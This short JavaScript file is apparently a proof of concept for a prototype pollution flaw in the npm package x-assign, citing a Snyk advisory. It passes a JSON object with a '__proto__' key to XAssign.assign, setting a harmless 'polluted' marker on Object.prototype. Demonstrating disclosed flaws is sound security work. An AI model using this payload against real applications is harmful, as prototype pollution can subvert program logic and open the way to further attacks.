//https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314
 
  const XAssign = require("x-assign");

   

  const a = { red: "apple" };
  const b = JSON.parse('{"__proto__": {"polluted": "yes"}}');
  const c = XAssign.assign(a, b);
// End of file
